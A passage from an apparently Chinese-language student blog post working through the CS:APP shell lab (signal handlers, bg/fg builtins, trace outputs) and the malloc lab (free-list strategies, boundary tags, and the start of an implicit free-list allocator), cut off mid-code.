2 &amp;</span></span><br><span class="line">[1] (317) ./myspin 2 &amp;</span><br><span class="line"><span class="meta">tsh&gt;</span><span class="bash"> ./myspin 3 &amp;</span></span><br><span class="line">[2] (319) ./myspin 3 &amp;</span><br><span class="line"><span class="meta">tsh&gt;</span><span class="bash"> <span class="built_in">jobs</span></span></span><br><span class="line">[1] (317) Running ./myspin 2 &amp;</span><br><span class="line">[2] (319) Running ./myspin 3 &amp;</span><br></pre></td></tr></table></figure>
<h3 id="06"><a href="#06" class="headerlink" title="06"></a>06</h3><p>这个就是实现处理sigint信号的handler函数，同时要修改一下<code>sigchld_handler</code>函数：</p>
<blockquote>
<p>关于<code>int kill(pid_t pid, int sig)</code>函数，pid可能的选择有以下四种：</p>
<ol>
<li>pid大于零时，pid是信号欲送往的进程的标识</li>
<li>pid等于零时，信号将送往所有与调用kill()的那个进程属同一个使用组的进程</li>
<li>pid等于-1时，信号将送往所有调用进程有权给其发送信号的进程，除了进程1(init)</li>
<li>pid小于-1时，信号将送往以-pid为组标识的进程</li>
</ol>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> old_errno = errno;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) </span><br><span class="line">        kill(-pid,sig);</span><br><span class="line">    errno = old_errno; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;	</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev;</span><br><span class="line"></span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    <span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status)) &#123;</span><br><span class="line">            sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">            deletejob(jobs, pid);	</span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status)) &#123;</span><br><span class="line">            struct <span class="keyword">job_t</span>* job = getjobpid(jobs, pid);</span><br><span class="line">            sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, job-&gt;jid, job-&gt;pid, WTERMSIG(status));</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后来让我们运行一下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">stardust@LAPTOP-4IJ6JI22:/mnt/e/Program/ipads/training/ics-lab$ make test06</span><br><span class="line">./sdriver.pl -t trace06.txt -s ./tsh -a "-p"</span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> trace06.txt - Forward SIGINT to foreground job.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">tsh&gt;</span><span class="bash"> ./myspin 4</span></span><br><span class="line">Job [1] (332) terminated by signal 2</span><br></pre></td></tr></table></figure>
<h3 id="08"><a href="#08" class="headerlink" title="08"></a>08</h3><p>这个和上面差不多，完善一下处理SIGTSTP信号的函数，补充一下对应的SIGCHLD部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> old_errno = errno;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>) </span><br><span class="line">        kill(-pid,sig);</span><br><span class="line">    errno = old_errno; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;	</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev;</span><br><span class="line"></span><br><span class="line">    sigfillset(&amp;mask_all);</span><br><span class="line">    <span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status)) &#123;</span><br><span class="line">            sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">            deletejob(jobs, pid);	</span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status)) &#123;</span><br><span class="line">            struct <span class="keyword">job_t</span>* job = getjobpid(jobs, pid);</span><br><span class="line">            sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, job-&gt;jid, job-&gt;pid, WTERMSIG(status));</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            struct <span class="keyword">job_t</span>* job = getjobpid(jobs, pid);</span><br><span class="line">            sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal %d\n"</span>, job-&gt;jid, job-&gt;pid, WSTOPSIG(status));</span><br><span class="line">            job-&gt;state= ST;</span><br><span class="line">            sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="09"><a href="#09" class="headerlink" title="09"></a>09</h3><p>完成 bg 和 fg 对应的函数：</p>
<p><strong>bg命令</strong>是先kill一个SIGCONT指令（<em>SIGCONT</em>用于继续进程），让暂停的进程继续，然后将job的state变成BG，再打印出来，然后就任由其在后台执行了。</p>
<p><strong>fg命令</strong>是先kill一个SIGCONT让暂停的进程继续，然后将job的state变成FG再waitfg去等待这个前台执行完成。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>]==<span class="literal">NULL</span>) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s command requires PID or %%jobid argument\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf</span>(argv[<span class="number">1</span>], <span class="string">"%%%d"</span>, &amp;id) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        job = getjobjid(jobs, id);</span><br><span class="line">        <span class="keyword">if</span> (job == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%%%d: No such job\n"</span>, id);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">sscanf</span>(argv[<span class="number">1</span>], <span class="string">"%d"</span>, &amp;id) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        job = getjobpid(jobs, id);</span><br><span class="line">        <span class="keyword">if</span> (job == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"(%d): No such process\n"</span>, id);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"bg"</span>)) &#123;</span><br><span class="line">        kill(-(job-&gt;pid), SIGCONT); </span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>,job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        kill(-(job-&gt;pid), SIGCONT); </span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask;</span><br><span class="line">    sigemptyset(&amp;mask);</span><br><span class="line">    <span class="keyword">while</span> (fgpid(jobs) &gt; <span class="number">0</span>)</span><br><span class="line">        sigsuspend(&amp;mask);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行一下试试：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">stardust@LAPTOP-4IJ6JI22:/mnt/e/Program/ipads/training/ics-lab$ make test09</span><br><span class="line">./sdriver.pl -t trace09.txt -s ./tsh -a "-p"</span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> trace09.txt - Process <span class="built_in">bg</span> <span class="built_in">builtin</span> <span class="built_in">command</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">tsh&gt;</span><span class="bash"> ./myspin 4 &amp;</span></span><br><span class="line">[1] (385) ./myspin 4 &amp;</span><br><span class="line"><span class="meta">tsh&gt;</span><span class="bash"> ./myspin 5</span></span><br><span class="line">Job [2] (387) stopped by signal 20</span><br><span class="line"><span class="meta">tsh&gt;</span><span class="bash"> <span class="built_in">jobs</span></span></span><br><span class="line">[1] (385) Running ./myspin 4 &amp;</span><br><span class="line">[2] (387) Stopped ./myspin 5</span><br><span class="line"><span class="meta">tsh&gt;</span><span class="bash"> <span class="built_in">bg</span> %2</span></span><br><span class="line">[2] (387) ./myspin 5</span><br><span class="line"><span class="meta">tsh&gt;</span><span class="bash"> <span class="built_in">jobs</span></span></span><br><span class="line">[1] (385) Running ./myspin 4 &amp;</span><br><span class="line">[2] (387) Running ./myspin 5</span><br></pre></td></tr></table></figure>
<p>主要功能实现就是跟着test01~test10，这样就可以完成所有函数的补充了，确实对信号机制理解深很多。</p>
<h1 id="Malloc"><a href="#Malloc" class="headerlink" title="Malloc"></a>Malloc</h1><h2 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="三种适配方式："><a href="#三种适配方式：" class="headerlink" title="三种适配方式："></a>三种适配方式：</h3><ul>
<li>fitst fit：最为直接的办法。扫描所有的块，只要当前块的大小满足要求就使用，速度较快。但容易导致空闲列表中前面的块被不断地细分，而后面的一些块却一直迟迟得不到利用。</li>
<li>next fit：扫描的时候，每次从上一次扫描的下一个块开始，这样可以使得整个列表的块都可以被使用，这使得效率更高。然而，实际应用中，作用也很有限，容易产生很大的空间浪费，造成大量碎片。</li>
<li>best fit：这种方式最大的好处是可以充分地利用空间。找到所有满足要求的块中最小的那一个，这样可以很大程度上避免浪费。当然，这也使得时间成本较高，尤其是如果空间链表的组织方式不太恰当的话，容易导致每次都要遍历一整个列表。</li>
</ul>
<h3 id="四种空闲列表的组织方式"><a href="#四种空闲列表的组织方式" class="headerlink" title="四种空闲列表的组织方式"></a>四种空闲列表的组织方式</h3><ul>
<li>implicit free list：这种方式最为简单，直接将所有的块（不管是否有分配）串在一起，然后遍历。这种方式可也使得块最小可以达到8 bytes。当然，这种方式效率很低，尤其是当块的数量较多的时候。</li>
<li>explicit free list：在每一个free 块中保存两个指针，将所有空闲的块组成一个双向链表。和隐式相比，这种方式最大的好处在于我们不需要遍历已经分配的块，速度上快了很多，当然，由于需要保存指针，所以每一个块最小为16 bytes。</li>
<li>segregated free list：这种方式的特点在于，根据块的不同大小，分成k组，组织成k条双向链表。分类的方式有很多，比如可以采用2的倍数的分类方式，{1},{2},{3-4},{5-8}……大小为6的块放在第四条链中，大小为3的块则放在第三条链中等等。</li>
<li>Red-Black Tree：按大小排序的平衡树，在每个空闲块中使用一个带指针的平衡树，并使用长度作为权值。</li>
</ul>
<h3 id="两种合并的方式"><a href="#两种合并的方式" class="headerlink" title="两种合并的方式"></a>两种合并的方式</h3><ul>
<li>immediate coalescing：每次释放后立即合并，当内存块被释放后，立即与相邻的空闲内存块合并，以获得一个更大的空闲块，插入到链表的相应位置。这样可以减少碎片化。</li>
<li>deferred coalescing： 尝试通过延迟合并，即直到需要才合并来提高释放的性能，例如:<ul>
<li>为 <strong>malloc</strong> 扫描空闲链表时可以合并</li>
<li>外部碎片达到阈值时可以合并<h3 id="带边界标记的合并"><a href="#带边界标记的合并" class="headerlink" title="带边界标记的合并"></a>带边界标记的合并</h3></li>
</ul>
</li>
</ul>
<p>分配器是如何实现合并的？如果要合并（内存中）下一个空闲块，只需要当前free掉的块的头部指向下一个块的头部，可以检查这个指针以判断下一个块是否是空闲的。如果是，就将它的大小简单地加到当前块头部的大小上，这两个块即可在常数时间内被合并。</p>
<p>但如果要合并前面的块呢？给定一个带头部的隐式空闲链表，唯一的选择将是搜索整个链表，记住前面块的位置，直到我们到达当前块。使用隐式空闲链表，这意味着每次调用 free 需要的时间都与堆的大小成线性关系。即使用更复杂精细的空闲链表组织，搜索时间也不会是常数。</p>
<p>由此引入了<strong>边界标记（</strong>boundary tag）允许在常数时间内进行对前面块的合并。这种思想是在每个块的结尾处添加一个<strong>脚部</strong>（footer，边界标记），其中脚部就是头部的一个副本。如果每个块包括这样一个脚部，那么分配器就可以通过检査它的脚部，判断前面一个块的起始位置和状态，这个脚部总是在距当前块开始位置一个字的距离。</p>
<p><img src="https://i.loli.net/2021/11/07/nKRrPxZClsQac27.png" alt="ICS-malloc-使用边界标记的堆块的格式.png"></p>
<p>边界标记的概念是简单优雅的，它对许多不同类型的分配器和空闲链表组织都是通用的。然而，它也存在一个潜在的缺陷。它要求每个块都保持一个头部和一个脚部，在应用程序操作许多个小块时，会产生显著的内存开销。例如，如果一个图形应用通过反复调用 malloc 和 free 来动态地创建和销毁图形节点，并且每个图形节点都只要求两个内存字，那么头部和脚部将占用每个已分配块的一半的空间。</p>
<p>幸运的是，有一种非常聪明的边界标记的优化方法，能够使得在已分配块中不再需要脚部。回想一下，当我们试图在内存中合并当前块以及前面的块和后面的块时，只有在前面的块是空闲时，才会需要用到它的脚部。如果我们把前面块的已分配/空闲位存放在当前块中多出来的低位中，那么已分配的块就不需要脚部了，这样我们就可以将这个多出来的空间用作有效载荷了。不过请注意，空闲块仍然需要脚部。</p>
<h3 id="两种内存碎片"><a href="#两种内存碎片" class="headerlink" title="两种内存碎片"></a>两种内存碎片</h3><ul>
<li>internal fragmentation：内部碎片，即是已经被分配出去（能明确指出属于哪个进程）却不能被利用的内存空间。比如当前我需要44 bytes的内存，然后malloc的时候分配到了一个48 bytes的块，这样的话，剩下的4 bytes的内存尽管我不需要用到，但是其他程序也无法使用，这就是内部碎片。</li>
<li>external fragmentation：外部碎片，即还没有被分配出去（不属于任何进程），但由于太小了无法分配给申请内存空间的新进程的内存空闲区域。</li>
</ul>
<h2 id="实验开始之前"><a href="#实验开始之前" class="headerlink" title="实验开始之前"></a>实验开始之前</h2><p>一般来说，做这个实验都会遇到首次make时报错的问题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">“fatal error: bits/libc-header-start.h: No such file or directory” while compiling</span><br></pre></td></tr></table></figure>
<p>这个只需要使用如下命令安装32位的库（不知道为什么我wsl和debian虚拟机都各种报错，直到ubuntu才成功</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gcc-multilib</span><br></pre></td></tr></table></figure>
<p>在make完之后，在执行<code>./mdriver -V</code>时会出现找不到文件路径的问题：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Testing mm malloc</span><br><span class="line">Reading tracefile: amptjp-bal.rep</span><br><span class="line">Could not open ... /amptjp-bal.rep in read_trace: No such file or directory</span><br></pre></td></tr></table></figure>
<p>这个只需要在config.h中设置TRACEDIR为自己traces文件夹的路径再重新make即可，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define TRACEDIR &quot;/home/os/Desktop/training/ics-lab/traces/&quot;</span><br></pre></td></tr></table></figure>
<h2 id="隐式空闲链表"><a href="#隐式空闲链表" class="headerlink" title="隐式空闲链表"></a>隐式空闲链表</h2><p>首先是用最简单的隐式空闲链表+首次适配+realloc方式，采用隐式空闲链表组织空闲块，并且在头部和尾部添加了序言块和结尾块，方便添加和释放块。在空闲块适配上，采用最简单的首次适配策略，由头到尾遍历的第一个符合大小的空闲块会被采用。这种方式显然不是最佳，会在头部形成大量碎片，最后跑分很低（划掉）</p>
<h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>首先是init函数，mm_init 函数初始化分配器，如果成功就返回 0，否则就返回 -1。</p>
<p><img src="https://i.loli.net/2021/11/07/IiEweaxW5J9fQYq.png" alt="ICS-malloc-隐式空闲链表的恒定形式.png"></p>
<p>第一个字是一个双字边界对齐的不使用的填充字。填充后面紧跟着一个特殊的序言块（prologue block），这是一个 8 字节的已分配块，只由一个头部和一个脚部组成。序言块是在初始化时创建的，并且永不释放。在序言块后紧跟的是零个或者多个由 malloc 或者 free 调用创建的普通块。堆总是以一个特殊的结尾块（epilogue block）来结束，这个块是一个大小为零的已分配块，只由一个头部组成。序言块和结尾块是一种消除合并时边界条件的技巧。分配器使用一个单独的私有（static）全局变量（heap_listp），它总是指向序言块。（作为一个小优化，我们可以让它指向下一个块，而不是这个序言块）</p>
<p>编写代码时还需要定义一些基本的宏：字的大小（WSIZE）双字的大小（DSIZE）初始空闲块的大小和扩展堆时的默认大小（CHUNKSIZE）；PACK 宏将大小和已分配位结合起来并返回一个值，可以把它存放在头部或者脚部中。GET 宏读取和返回参数 p 引用的字。这里强制类型转换是至关重要的，参数 P 典型地是一个<strong>(viod*)</strong> 指针，不可以直接进行间接引用。同理，PUT 宏将 val 存放在参数 p 指向的字中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WSIZE       4       <span class="comment">/* Word and header/footer size (bytes) */</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DSIZE       8       <span class="comment">/* Double word size (bytes) */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHUNKSIZE  (1&lt;&lt;12)  <span class="comment">/* Extend heap by this amount (bytes) */</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Pack a size and allocated bit into a word */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PACK(size, alloc)  ((size) | (alloc)) </span></span><br><span class="line"><span class="comment">/* Read the size and allocated fields from address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_SIZE(p)  (GET(p) &amp; ~0x7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_ALLOC(p) (GET(p) &amp; 0x1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read and write a word at address p */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUT(p, val)  (*(unsigned int *)(p) = (val)) </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET(p)       (*(unsigned int *)(p))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mm_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( (heap_list = mem_sbrk(<span class="number">4</span> * WSIZE)) == <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    PUT(heap_list, <span class="number">0</span>);                            <span class="comment">/* Alignment padding */</span></span><br><span class="line">    PUT(heap_list + (<span class="number">1</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>)); <span class="comment">/* Prologue header */</span></span><br><span class="line">    PUT(heap_list + (<span class="number">2</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>)); <span class="comment">/* Prologue footer */</span></span><br><span class="line">    PUT(heap_list + (<span class="number">3</span> * WSIZE), PACK(<span class="number">0</span>, <span class="number">1</span>));     <span class="comment">/* Epilogue header */</span></span><br><span class="line">    heap_list += (<span class="number">2</span> * WSIZE);</span><br><span class="line">    <span class="comment">/* Extend the empty heap with a free block of CHUNKSIZE bytes */</span></span><br><span class="line">    <span class="keyword">if</span>(extend_heap(CHUNKSIZE / WSIZE) == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>GET_SIZE 和 GET_ALLOC 宏从地址 p 处的头部或者脚部分别返回大小和已分配位。剩下的宏是对<strong>块指针</strong>（block pointer 用<code>bp</code>表示）的操作，块指针指向第一个有效载荷字节。给定一个块指针 bp，HDRP 和 FTRP 宏分别返回指向这个块的头部和脚部的指针。NEXT_BLKP 和 PREV_BLKP 宏分别返回指向后面的块和前面的块的块指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Given block ptr bp, compute address of its header and footer */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HDRP(bp)       ((char *)(bp) - WSIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FTRP(bp)       ((char *)(bp) + GET_SIZE(HDRP(bp)) - DSIZE)</span></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of next and previous blocks */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NEXT_BLKP(bp)  ((char *)(bp) + GET_SIZE(((char *)(bp) - WSIZE)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_BLKP(bp)  ((char *)(bp) - GET_SIZE(((char *)(bp) - DSIZE)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">extend_heap</span><span class="params">(<span class="keyword">size_t</span> words)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *bp;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate an even number of words to maintain alignment */</span></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * WSIZE : words * WSIZE;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Initialize free block header/footer and the 